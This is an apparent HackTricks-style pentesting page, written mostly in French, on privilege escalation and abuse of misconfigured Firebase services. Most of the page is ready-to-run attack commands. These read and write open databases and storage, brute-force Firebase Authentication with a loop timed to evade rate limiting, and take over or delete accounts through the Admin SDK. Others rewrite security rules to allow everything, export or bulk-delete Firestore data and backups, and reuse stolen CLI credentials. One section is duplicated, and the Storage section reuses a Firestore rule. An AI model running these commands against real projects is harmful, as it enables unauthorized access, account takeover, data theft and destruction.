# GCP - Firebase Privesc

{{#include ../../../banners/hacktricks-training.md}}

## Firebase

### Unauthenticated access to Firebase Realtime Database
Un attaquant n'a pas besoin d'autorisations Firebase spécifiques pour réaliser cette attaque. Il suffit qu'il y ait une configuration vulnérable dans les règles de sécurité de Firebase Realtime Database, où les règles sont définies avec `.read: true` ou `.write: true`, permettant un accès public en lecture ou en écriture.

L'attaquant doit identifier l'URL de la base de données, qui suit généralement le format : `https://<project-id>.firebaseio.com/`.

Cette URL peut être trouvée via mobile application reverse engineering (decompiling Android APKs or analyzing iOS apps), en analysant des fichiers de configuration tels que google-services.json (Android) ou GoogleService-Info.plist (iOS), en inspectant le code source des applications web, ou en examinant le trafic réseau pour identifier des requêtes vers des domaines `*.firebaseio.com`.

L'attaquant identifie l'URL de la base de données et vérifie si elle est exposée publiquement, puis accède aux données et peut potentiellement écrire des informations malveillantes.

Tout d'abord, l'attaquant vérifie si la base de données permet l'accès en lecture en ajoutant .json à l'URL.
```bash
curl https://<project-id>-default-rtdb.firebaseio.com/.json
```
Si la réponse contient des données JSON ou null (au lieu de "Permission Denied"), la base de données autorise l'accès en lecture. Pour vérifier l'accès en écriture, un attacker peut tenter d'envoyer une requête d'écriture de test en utilisant le Firebase REST API.
```bash
curl -X PUT https://<project-id>-default-rtdb.firebaseio.com/test.json -d '{"test": "data"}'
```
Si l'opération réussit, la base de données permet également l'accès en écriture.


### Exposition des données dans Cloud Firestore
Un attaquant n'a pas besoin de permissions Firebase spécifiques pour mener cette attaque. Il suffit qu'il y ait une configuration vulnérable dans les règles de sécurité Cloud Firestore où les règles autorisent l'accès en lecture ou en écriture sans authentification ou avec une validation insuffisante. Un exemple de règle mal configurée qui accorde un accès complet est :
```bash
service cloud.firestore {
match /databases/{database}/documents/{document=**} {
allow read, write: if true;
}
}
```
Cette règle permet à quiconque de lire et d'écrire tous les documents sans aucune restriction. Les règles Firestore sont granulaires et s'appliquent par collection et par document, donc une erreur dans une règle spécifique peut n'exposer que certaines collections.

L'attaquant doit identifier le Firebase Project ID, qui peut être trouvé via mobile app reverse engineering, l'analyse des fichiers de configuration tels que google-services.json ou GoogleService-Info.plist, l'inspection du code source des applications web, ou l'analyse du trafic réseau pour identifier les requêtes vers firestore.googleapis.com.
L'API REST Firestore utilise le format :
```bash
https://firestore.googleapis.com/v1/projects/<PROJECT_ID>/databases/(default)/documents/<collection>/<document>
```
Si les règles autorisent l'accès en lecture non authentifié, l'attaquant peut lire les collections et les documents. D'abord, il tente d'accéder à une collection spécifique :
```bash
curl https://firestore.googleapis.com/v1/projects/<PROJECT_ID>/databases/(default)/documents/<collection>
```
Si la réponse contient des documents JSON au lieu d'une erreur d'autorisation, la collection est exposée. L'attaquant peut énumérer toutes les collections accessibles en essayant des noms courants ou en analysant la structure de l'application. Pour accéder à un document spécifique :
```bash
curl https://firestore.googleapis.com/v1/projects/<PROJECT_ID>/databases/(default)/documents/<collection>/<document>
```
Si les règles autorisent un accès en écriture non authentifié ou n'ont pas de validation suffisante, l'attaquant peut créer de nouveaux documents :
```bash
curl -X POST https://firestore.googleapis.com/v1/projects/<PROJECT_ID>/databases/(default)/documents/<collection> \
-H "Content-Type: application/json" \
-d '{
"fields": {
"name": {"stringValue": "Test"},
"email": {"stringValue": "test@example.com"}
}
}'
```
Pour modifier un document existant, il faut utiliser PATCH :
```bash
curl -X PATCH https://firestore.googleapis.com/v1/projects/<PROJECT_ID>/databases/(default)/documents/users/<user-id> \
-H "Content-Type: application/json" \
-d '{
"fields": {
"role": {"stringValue": "admin"}
}
}'
```
Pour supprimer un document et provoquer un déni de service :
```bash
curl -X DELETE https://firestore.googleapis.com/v1/projects/<PROJECT_ID>/databases/(default)/documents/<collection>/<document>
```
### Exposition de fichiers dans Firebase Storage
Un attaquant n'a pas besoin de permissions Firebase spécifiques pour mener cette attaque. Il suffit qu'il y ait une configuration vulnérable dans les Firebase Storage security rules où les rules autorisent read ou write access sans authentification ou avec une validation insuffisante. Les Storage rules contrôlent indépendamment les permissions de read et write, donc une erreur dans une rule peut exposer uniquement read access, uniquement write access, ou les deux. Un exemple de rule mal configurée qui accorde un accès complet est :
```bash
service cloud.firestore {
match /databases/{database}/documents/{document=**} {
allow read, write: if true;
}
}
```
Cette règle permet l'accès en lecture et écriture à tous les documents sans aucune restriction. Les Firestore rules sont granulaires et s'appliquent par collection et par document, donc une erreur dans une règle spécifique peut n'exposer que certaines collections. L'attaquant doit identifier le Firebase Project ID, qui peut être trouvé via mobile application reverse engineering, l'analyse de fichiers de configuration tels que google-services.json ou GoogleService-Info.plist, l'inspection du code source de l'application web, ou network traffic analysis pour identifier des requêtes vers firestore.googleapis.com.

La Firestore REST API utilise le format: `https://firestore.googleapis.com/v1/projects/<PROJECT_ID>/databases/(default)/documents/<collection>/<document>.`

Si les règles autorisent un accès en lecture sans authentification, l'attaquant peut lire les collections et les documents. Il tente d'abord d'accéder à une collection spécifique.
```bash
curl "https://firebasestorage.googleapis.com/v0/b/<bucket>/o"
curl "https://firebasestorage.googleapis.com/v0/b/<bucket>/o?prefix=<path>"
```
Si la réponse contient la liste des fichiers au lieu d'une erreur d'autorisation, le fichier est exposé. L'attaquant peut afficher le contenu des fichiers en spécifiant leur chemin :
```bash
curl "https://firebasestorage.googleapis.com/v0/b/<bucket>/o/<urlencode(path)>"
```
Si les règles autorisent un accès en écriture non authentifié ou si la validation est insuffisante, l'attaquant peut téléverser des fichiers malveillants. Pour téléverser un fichier via l'API REST :
```bash
curl -X POST "https://firebasestorage.googleapis.com/v0/b/<bucket>/o?name=<path>" \
-H "Content-Type: <content-type>" \
--data-binary @<local-file>
```
L'attaquant peut téléverser des code shells, des malware payloads, ou de gros fichiers pour provoquer un denial of service. Si l'application traite ou exécute les fichiers téléversés, l'attaquant peut obtenir une remote code execution. Pour supprimer des fichiers et provoquer un denial of service :
```bash
curl -X DELETE "https://firebasestorage.googleapis.com/v0/b/<bucket>/o/<path>"
```
### Invocation publique de Firebase Cloud Functions
Un attaquant n'a pas besoin de permissions Firebase spécifiques pour exploiter ce problème ; il suffit qu'une Cloud Function soit accessible publiquement via HTTP sans authentification.

Une fonction est vulnérable lorsqu'elle est mal configurée :

- Elle utilise functions.https.onRequest, qui n'applique pas l'authentification (contrairement aux onCall functions).
- Le code de la fonction ne valide pas l'authentification de l'utilisateur (par ex., pas de vérifications pour request.auth ou context.auth).
- La fonction est accessible publiquement dans IAM, c'est-à-dire que allUsers a le rôle roles/cloudfunctions.invoker. C'est le comportement par défaut pour les HTTP functions à moins que le développeur ne restreigne l'accès.

Firebase HTTP Cloud Functions sont exposées via des URLs telles que :

- https://<region>-<project-id>.cloudfunctions.net/<function-name>
- https://<project-id>.web.app/<function-name> (lorsqu'elles sont intégrées avec Firebase Hosting)

Un attaquant peut découvrir ces URLs via source code analysis, network traffic inspection, enumeration tools, ou mobile app reverse engineering.
Si la fonction est exposée publiquement et sans authentification, l'attaquant peut l'invoquer directement sans identifiants.
```bash
# Invoke public HTTP function with GET
curl "https://<region>-<project-id>.cloudfunctions.net/<function-name>"
# Invoke public HTTP function with POST and data
curl -X POST "https://<region>-<project-id>.cloudfunctions.net/<function-name>" \
-H "Content-Type: application/json" \
-d '{"param1": "value1", "param2": "value2"}'
```
Si la fonction ne valide pas correctement les entrées, l'attaquant peut tenter d'autres attaques telles que l'injection de code ou l'injection de commandes.


### Brute-force attack against Firebase Authentication with a weak password policy
Un attaquant n'a besoin d'aucune permission Firebase spécifique pour mener cette attaque. Il suffit que la Firebase API Key soit exposée dans des applications mobiles ou web, et que la politique de mot de passe n'ait pas été configurée avec des exigences plus strictes que les valeurs par défaut.

L'attaquant doit identifier la Firebase API Key, qui peut être trouvée via le reverse engineering d'applications mobiles, l'analyse de fichiers de configuration tels que google-services.json ou GoogleService-Info.plist, l'inspection du code source d'applications web (par exemple dans bootstrap.js), ou l'analyse du trafic réseau.

L'API REST de Firebase Authentication utilise le point de terminaison :
`https://identitytoolkit.googleapis.com/v1/accounts:signInWithPassword?key=<API_KEY>`
pour s'authentifier avec un email et un mot de passe.

Si Email Enumeration Protection est désactivé, les réponses d'erreur de l'API peuvent révéler si un email existe dans le système (EMAIL_NOT_FOUND vs. INVALID_PASSWORD), ce qui permet aux attaquants d'énumérer les utilisateurs avant de tenter des devinettes de mot de passe. Lorsque cette protection est activée, l'API renvoie le même message d'erreur pour les emails inexistants et les mots de passe incorrects, empêchant l'énumération des utilisateurs.

Il est important de noter que Firebase Authentication impose une limitation du nombre de requêtes, qui peut bloquer les requêtes si trop de tentatives d'authentification surviennent en peu de temps. À cause de cela, un attaquant devra introduire des délais entre les tentatives pour éviter d'être soumis à cette limitation.

L'attaquant identifie la API Key et effectue des tentatives d'authentification avec plusieurs mots de passe contre des comptes connus. Si Email Enumeration Protection est désactivé, l'attaquant peut énumérer les utilisateurs existants en analysant les réponses d'erreur :
```bash
# Attempt authentication with a known email and an incorrect password
curl -X POST "https://identitytoolkit.googleapis.com/v1/accounts:signInWithPassword?key=<API_KEY>" \
-H "Content-Type: application/json" \
-d '{
"email": "usuario@example.com",
"password": "password",
"returnSecureToken": true
}'
```
Si la réponse contient EMAIL_NOT_FOUND, l'email n'existe pas dans le système. Si elle contient INVALID_PASSWORD, l'email existe mais le mot de passe est incorrect, ce qui confirme que l'utilisateur est enregistré. Une fois qu'un utilisateur valide est identifié, l'attaquant peut effectuer des tentatives de brute-force. Il est important d'inclure des pauses entre les tentatives pour éviter les mécanismes de rate-limiting de Firebase Authentication :
```bash
counter=1
for password in $(cat wordlist.txt); do
echo "Intento $counter: probando contraseña '$password'"
response=$(curl -s -X POST "https://identitytoolkit.googleapis.com/v1/accounts:signInWithPassword?key=<API_KEY>" \
-H "Content-Type: application/json" \
-d "{\"email\":\"usuario@example.com\",\"password\":\"$password\",\"returnSecureToken\":true}")

if echo "$response" | grep -q "idToken"; then
echo "Contraseña encontrada: $password (intento $counter)"
break
fi

# Stop for the rate limiting
sleep 1
counter=$((counter + 1))
done
```
Avec la politique de mot de passe par défaut (minimum 6 caractères, aucune exigence de complexité), l'attaquant peut tester toutes les combinaisons possibles de mots de passe de 6 caractères, ce qui représente un espace de recherche relativement réduit comparé à des politiques de mot de passe plus strictes.

### User management in Firebase Authentication

L'attaquant a besoin de permissions spécifiques sur Firebase Authentication pour réaliser cette attaque. Les permissions requises sont :

- `firebaseauth.users.create` pour créer des utilisateurs
- `firebaseauth.users.update` pour modifier des utilisateurs existants
- `firebaseauth.users.delete` pour supprimer des utilisateurs
- `firebaseauth.users.get` pour récupérer des informations utilisateur
- `firebaseauth.users.sendEmail` pour envoyer des emails aux utilisateurs
- `firebaseauth.users.createSession` pour créer des sessions utilisateur

Ces permissions sont incluses dans le rôle `roles/firebaseauth.admin`, qui accorde un accès complet en lecture/écriture aux ressources Firebase Authentication. Elles sont également incluses dans des rôles de niveau supérieur tels que roles/firebase.developAdmin (qui inclut toutes les permissions firebaseauth.*) et roles/firebase.admin (accès complet à tous les services Firebase).

Pour utiliser le Firebase Admin SDK, l'attaquant aurait besoin d'un accès aux identifiants de compte de service (fichier JSON), qui peuvent être trouvés sur des systèmes compromis, des dépôts de code publiquement exposés, des systèmes CI/CD compromis, ou via la compromission de comptes développeurs ayant accès à ces identifiants.

La première étape consiste à configurer le Firebase Admin SDK en utilisant les identifiants du compte de service.
```bash
import firebase_admin
from firebase_admin import credentials, auth
cred = credentials.Certificate('path/to/serviceAccountKey.json')
firebase_admin.initialize_app(cred)
```
Pour créer un utilisateur malveillant en utilisant l'adresse e-mail d'une victime, l'attaquant tenterait d'utiliser le Firebase Admin SDK pour générer un nouveau compte associé à cette adresse e-mail.
```bash
user = auth.create_user(
email='victima@example.com',
email_verified=False,
password='password123',
display_name='Usuario Malicioso',
disabled=False
)
print(f'Usuario creado: {user.uid}')
```
Pour modifier un utilisateur existant, l'attaquant mettrait à jour des champs tels que l'adresse e-mail, le statut de vérification ou si le compte est désactivé.
```bash
user = auth.update_user(
uid,
email='nuevo-email@example.com',
email_verified=True,
disabled=False
)
print(f'Usuario actualizado: {user.uid}')
```
Pour supprimer un compte utilisateur et provoquer une denial of service, l'attaquant enverrait une requête pour supprimer entièrement l'utilisateur.
```bash
auth.delete_user(uid)
print('Usuario eliminado exitosamente')
```
L'attaquant peut également récupérer des informations sur des utilisateurs existants en demandant leur UID ou leur adresse e-mail.
```bash
user = auth.get_user(uid)
print(f'Información del usuario: {user.uid}, {user.email}')
user = auth.get_user_by_email('usuario@example.com')
print(f'Información del usuario: {user.uid}, {user.email}')
```
De plus, l'attaquant pourrait générer des liens de vérification ou des liens de réinitialisation de mot de passe afin de modifier le mot de passe d'un utilisateur et d'accéder à son compte.
```bash
link = auth.generate_email_verification_link(email)
print(f'Link de verificación: {link}')
link = auth.generate_password_reset_link(email)
print(f'Link de reset: {link}')
```
### Gestion des utilisateurs dans Firebase Authentication
Un attaquant a besoin de permissions spécifiques de Firebase Authentication pour réaliser cette attaque. Les permissions requises sont :

- `firebaseauth.users.create` to create users
- `firebaseauth.users.update` to modify existing users
- `firebaseauth.users.delete` to delete users
- `firebaseauth.users.get` to obtain user information
- `firebaseauth.users.sendEmail` to send emails to users
- `firebaseauth.users.createSession` to create user sessions

Ces permissions sont incluses dans le rôle roles/firebaseauth.admin, qui accorde un accès complet en lecture/écriture aux ressources Firebase Authentication. Elles font également partie de rôles de niveau supérieur tels que `roles/firebase.developAdmin` (qui inclut toutes les permissions firebaseauth.*) et `roles/firebase.admin` (accès complet à tous les services Firebase).

Pour utiliser le Firebase Admin SDK, l'attaquant aurait besoin d'accès aux identifiants de compte de service (fichier JSON), qui pourraient être obtenus à partir de systèmes compromis, de dépôts de code exposés publiquement, d'environnements CI/CD compromis, ou via la compromission de comptes développeurs ayant accès à ces identifiants.

La première étape consiste à configurer le Firebase Admin SDK en utilisant les identifiants de compte de service.
```bash
import firebase_admin
from firebase_admin import credentials, auth
cred = credentials.Certificate('path/to/serviceAccountKey.json')
firebase_admin.initialize_app(cred)
```
Pour créer un utilisateur malveillant en utilisant l'adresse e-mail d'une victime, l'attaquant tenterait de créer un nouveau compte utilisateur avec cette adresse e-mail, en lui assignant son propre mot de passe et ses informations de profil.
```bash
user = auth.create_user(
email='victima@example.com',
email_verified=False,
password='password123',
display_name='Usuario Malicioso',
disabled=False
)
print(f'Usuario creado: {user.uid}')
```
Pour modifier un utilisateur existant, l'attaquant changerait des champs tels que l'adresse e-mail, le statut de vérification ou si le compte est désactivé.
```bash
user = auth.update_user(
uid,
email='nuevo-email@example.com',
email_verified=True,
disabled=False
)
print(f'Usuario actualizado: {user.uid}')
```
Pour supprimer un compte utilisateur—entraînant effectivement une denial of service—l'attaquant enverrait une requête pour le supprimer définitivement.
```bash
auth.delete_user(uid)
print('Usuario eliminado exitosamente')
```
L'attaquant pourrait aussi récupérer des informations sur les utilisateurs existants, comme leur UID ou email, en demandant les détails de l'utilisateur soit par UID soit par email.
```bash
user = auth.get_user(uid)
print(f'Información del usuario: {user.uid}, {user.email}')
user = auth.get_user_by_email('usuario@example.com')
print(f'Información del usuario: {user.uid}, {user.email}')
```
De plus, l'attaquant pourrait générer des liens de vérification ou des liens de réinitialisation de mot de passe, ce qui lui permettrait de changer le mot de passe d'un utilisateur et de prendre le contrôle du compte.
```bash
link = auth.generate_email_verification_link(email)
print(f'Link de verificación: {link}')
link = auth.generate_password_reset_link(email)
print(f'Link de reset: {link}')
```
### Modification des règles de sécurité dans les services Firebase
L'attaquant a besoin de permissions spécifiques pour modifier les règles de sécurité selon le service. Pour Cloud Firestore et Firebase Cloud Storage, les permissions requises sont `firebaserules.rulesets.create` pour créer des rulesets et `firebaserules.releases.create` pour déployer des releases. Ces permissions sont incluses dans le rôle `roles/firebaserules.admin` ou dans des rôles de plus haut niveau tels que `roles/firebase.developAdmin` et `roles/firebase.admin`. Pour Firebase Realtime Database, la permission requise est `firebasedatabase.instances.update`.

L'attaquant doit utiliser l'API REST de Firebase pour modifier les règles de sécurité.
D'abord, l'attaquant devra obtenir un jeton d'accès en utilisant des identifiants de compte de service.
Pour obtenir le jeton :
```bash
gcloud auth activate-service-account --key-file=path/to/serviceAccountKey.json
ACCESS_TOKEN=$(gcloud auth print-access-token)
```
Pour modifier les règles de Firebase Realtime Database :
```bash
curl -X PUT "https://<project-id>-default-rtdb.firebaseio.com/.settings/rules.json?access_token=$ACCESS_TOKEN" \
-H "Content-Type: application/json" \
-d '{
"rules": {
".read": true,
".write": true
}
}'
```
Pour modifier les règles de Cloud Firestore, l'attaquant doit créer un ruleset puis le déployer :
```bash
curl -X POST "https://firebaserules.googleapis.com/v1/projects/<project-id>/rulesets" \
-H "Authorization: Bearer $ACCESS_TOKEN" \
-H "Content-Type: application/json" \
-d '{
"source": {
"files": [{
"name": "firestore.rules",
"content": "rules_version = '\''2'\'';\nservice cloud.firestore {\n  match /databases/{database}/documents {\n    match /{document=**} {\n      allow read, write: if true;\n    }\n  }\n}"
}]
}
}'
```
La commande précédente renvoie un nom de ruleset au format projects/<project-id>/rulesets/<ruleset-id>. Pour déployer la nouvelle version, la release doit être mise à jour en utilisant une requête PATCH :
```bash
curl -X PATCH "https://firebaserules.googleapis.com/v1/projects/<project-id>/releases/cloud.firestore" \
-H "Authorization: Bearer $ACCESS_TOKEN" \
-H "Content-Type: application/json" \
-d '{
"release": {
"name": "projects/<project-id>/releases/cloud.firestore",
"rulesetName": "projects/<project-id>/rulesets/<ruleset-id>"
}
}'
```
Pour modifier les règles de Firebase Cloud Storage :
```bash
curl -X POST "https://firebaserules.googleapis.com/v1/projects/<project-id>/rulesets" \
-H "Authorization: Bearer $ACCESS_TOKEN" \
-H "Content-Type: application/json" \
-d '{
"source": {
"files": [{
"name": "storage.rules",
"content": "service firebase.storage {\n  match /b/{bucket}/o {\n    match /{allPaths=**} {\n      allow read, write: if true;\n    }\n  }\n}"
}]
}
}'
```
La commande précédente renvoie un nom de ruleset au format projects/<project-id>/rulesets/<ruleset-id>. Pour déployer la nouvelle version, la release doit être mise à jour en utilisant une requête PATCH :
```bash
curl -X PATCH "https://firebaserules.googleapis.com/v1/projects/<project-id>/releases/firebase.storage/<bucket-id>" \
-H "Authorization: Bearer $ACCESS_TOKEN" \
-H "Content-Type: application/json" \
-d '{
"release": {
"name": "projects/<project-id>/releases/firebase.storage/<bucket-id>",
"rulesetName": "projects/<project-id>/rulesets/<ruleset-id>"
}
}'
```
### Exfiltration et manipulation de données dans Cloud Firestore
Cloud Firestore utilise la même infrastructure et le même système d'autorisations que Cloud Datastore, donc les permissions Datastore IAM s'appliquent directement à Firestore. Pour manipuler les politiques TTL, la permission `datastore.indexes.update` est requise. Pour exporter des données, la permission `datastore.databases.export` est requise. Pour importer des données, la permission datastore.databases.import est requise. Pour effectuer une suppression massive de données, la permission `datastore.databases.bulkDelete` est requise.

Pour les opérations de sauvegarde et de restauration, des permissions spécifiques sont nécessaires :

- `datastore.backups.get` et `datastore.backups.list` pour lister et récupérer les détails des sauvegardes disponibles
- `datastore.backups.delete` pour supprimer des sauvegardes
- `datastore.backups.restoreDatabase` pour restaurer une base de données à partir d'une sauvegarde
- `datastore.backupSchedules.create` et `datastore.backupSchedules.delete` pour gérer les plannings de sauvegarde

Lorsqu'une politique TTL est créée, une propriété désignée est sélectionnée pour identifier les entités éligibles à la suppression. Cette propriété TTL doit être du type Date et heure. L'attaquant peut choisir une propriété qui existe déjà ou désigner une propriété qu'il prévoit d'ajouter plus tard. Si la valeur du champ est une date passée, le document devient éligible à une suppression immédiate. L'attaquant peut utiliser le gcloud CLI pour manipuler les politiques TTL.
```bash
# Enable TTL
gcloud firestore fields ttls update expireAt \
--collection-group=users \
--enable-ttl
# Disable TTL
gcloud firestore fields ttls update expireAt \
--collection-group=users \
--disable-ttl
```
Pour exporter des données et les exfiltrer, l'attaquant pourrait utiliser le gcloud CLI.
```bash
gcloud firestore export gs://<bucket-name> --project=<project-id> --async --database='(default)'
```
Pour importer des données malveillantes :
```bash
gcloud firestore import gs://<bucket-name>/<path> --project=<project-id> --async --database='(default)'
```
Pour effectuer une suppression massive de données et provoquer un déni de service, l'attaquant pourrait utiliser l'outil gcloud Firestore bulk-delete pour supprimer des collections entières.
```bash
gcloud firestore bulk-delete \
--collection-ids=users,posts,messages \
--database='(default)' \
--project=<project-id>
```
Pour les opérations de sauvegarde et de restauration, l'attaquant pourrait créer des sauvegardes planifiées pour capturer l'état actuel de la base de données, lister les sauvegardes existantes, restaurer depuis une sauvegarde pour écraser les modifications récentes, supprimer des sauvegardes pour provoquer une perte de données permanente, et supprimer les sauvegardes planifiées.
Pour créer une planification de sauvegarde quotidienne qui génère immédiatement une sauvegarde :
```bash
gcloud firestore backups schedules create \
--database='(default)' \
--recurrence=daily \
--retention=14w \
--project=<project-id>
```
Pour effectuer un restore à partir d'un backup spécifique, l'attaquant pourrait créer une nouvelle database en utilisant les données contenues dans ce backup. L'opération de restore écrit les données du backup dans une nouvelle database, ce qui signifie qu'un DATABASE_ID existant ne peut pas être utilisé.
```bash
gcloud firestore databases restore \
--source-backup=projects/<project-id>/locations/<location>/backups/<backup-id> \
--destination-database='<new-database-id>' \
--project=<project-id>
```
Pour supprimer une sauvegarde et provoquer une perte de données permanente :
```bash
gcloud firestore backups delete \
--backup=<backup-id> \
--project=<project-id>
```
### Vol et mauvaise utilisation des Firebase CLI credentials
Un attaquant n'a pas besoin d'autorisations Firebase spécifiques pour réaliser cette attaque, mais il doit avoir accès au système local du développeur ou au fichier de Firebase CLI credentials. Ces credentials sont stockés dans un fichier JSON situé à :

- Linux/macOS: ~/.config/configstore/firebase-tools.json

- Windows: C:\Users\[User]\.config\configstore\firebase-tools.json

Ce fichier contient des tokens d'authentification, incluant le refresh_token et l'access_token, qui permettent à l'attaquant de s'authentifier en tant qu'utilisateur ayant exécuté firebase login à l'origine.

L'attaquant obtient l'accès au fichier de Firebase CLI credentials. Il peut ensuite copier le fichier entier sur son propre système, et le Firebase CLI utilisera automatiquement les credentials depuis son emplacement par défaut. Après cela, l'attaquant peut consulter tous les projets Firebase accessibles à cet utilisateur.
```bash
firebase projects:list
```
{{#include ../../../banners/hacktricks-training.md}}
